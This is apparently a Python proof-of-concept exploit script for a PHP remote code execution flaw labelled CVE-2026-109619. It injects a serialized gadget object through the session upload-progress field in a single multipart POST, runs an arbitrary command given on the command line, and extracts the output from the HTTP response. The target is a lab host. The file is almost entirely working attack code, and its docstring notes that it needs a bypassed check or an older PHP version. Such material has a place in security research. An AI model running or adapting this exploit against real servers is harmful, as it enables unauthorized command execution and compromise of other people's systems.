#!/usr/bin/env python3
"""
CVE-2026-109619: PHP Session Upload Progress — Pure HTTP RCE
No SSH, no GDB, no /proc/PID/mem. 100% remote over HTTP.

Technique: Session Deserialization Injection via Upload Progress
  PHP_SESSION_UPLOAD_PROGRESS value is concatenated into the session
  key via smart_str_appendl with NO sanitization. A pipe character '|'
  splits the PHP session serializer's key|serialized_value format,
  injecting an arbitrary serialized object into the session.

  Single-request attack:
  1. Multipart POST with injected progress key + file upload
  2. RFC1867 handler creates session, writes progress to disk (flush)
  3. Session decode reads injected gadget → __wakeup() fires → RCE
  4. Command output appears in the HTTP response

  The PHP 8.x session encode function has a memchr check that blocks
  '|' in session keys (session.c PS_SERIALIZER_ENCODE_FUNC). This PoC
  requires that check to be bypassed (binary patch) or an older PHP
  version without the check.

Requirements:
  - session.upload_progress.enabled = On (default)
  - session.serialize_handler = php (default)
  - A deserialization gadget class available to the session decoder
  - session.upload_progress.cleanup = Off (or race before cleanup)
  - Any accessible .php endpoint on the target
"""
import socket
import sys
import os
import random


TARGET = "192.168.7.54"
PORT = 80
TARGET_URI = "/lab.php"
GADGET_CLASS = "CVE2026Gadget"


def make_sid():
    return ''.join(random.choices('0123456789abcdef', k=32))


def recv_response(sock, timeout=10):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def exploit(cmd):
    sid = make_sid()
    boundary = "Bnd" + os.urandom(8).hex()

    cls = GADGET_CLASS
    injection = f'|O:{len(cls)}:"{cls}":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'

    progress_part = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n"
        f"{injection}"
    )
    file_part = (
        f"\r\n--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="data.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n"
        f"\r\n"
    )
    file_data = "A" * 50000
    ending = f"\r\n--{boundary}--\r\n"
    body = progress_part + file_part + file_data + ending

    request = (
        f"POST {TARGET_URI} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    )

    print(f"[*] CVE-2026-109619 — Pure HTTP RCE")
    print(f"[*] Target:  {TARGET}:{PORT}{TARGET_URI}")
    print(f"[*] Command: {cmd}")
    print(f"[*] Session: {sid}")
    print(f"[*] Gadget:  {cls} ({len(cls)} chars)")
    print()

    print("[1] Sending single-request exploit …")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((TARGET, PORT))
    sock.sendall(request.encode())
    print(f"    Sent {len(request)} bytes")

    print("[2] Reading response …")
    resp = recv_response(sock)
    sock.close()

    text = resp.decode(errors='replace')
    parts = text.split("\r\n\r\n", 1)
    headers = parts[0] if parts else ""
    body_text = parts[1] if len(parts) > 1 else ""
    status = headers.split("\r\n", 1)[0]

    print(f"    Status: {status}")
    print()

    if "Failed to decode" in body_text:
        print("[!] FAILED — session decode error (check gadget class name/length)")
        print(f"    Body: {body_text[:300]}")
        return False

    # Extract RCE output (appears before the PHP script output)
    lab_marker = "LABOK"
    if lab_marker in body_text:
        idx = body_text.index(lab_marker)
        raw_output = body_text[:idx]
        lines = []
        for line in raw_output.split('\n'):
            line = line.strip()
            if not line:
                continue
            try:
                int(line, 16)
                continue
            except ValueError:
                pass
            if '<br />' in line or '<b>Warning</b>' in line:
                continue
            lines.append(line)

        if lines:
            rce_output = '\n'.join(lines)
            print("=" * 60)
            print(f"  RCE OUTPUT:")
            print("=" * 60)
            for l in lines:
                print(f"  {l}")
            print("=" * 60)
            print(f"  ★ PURE HTTP RCE SUCCESS ★")
            print("=" * 60)
            return True
        else:
            print("[?] No command output before script marker")
            print(f"    (command may have produced no stdout)")
            return True
    else:
        print("[?] No script marker found — showing full body:")
        print(body_text[:500])
        return False


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    success = exploit(cmd)
    sys.exit(0 if success else 1)
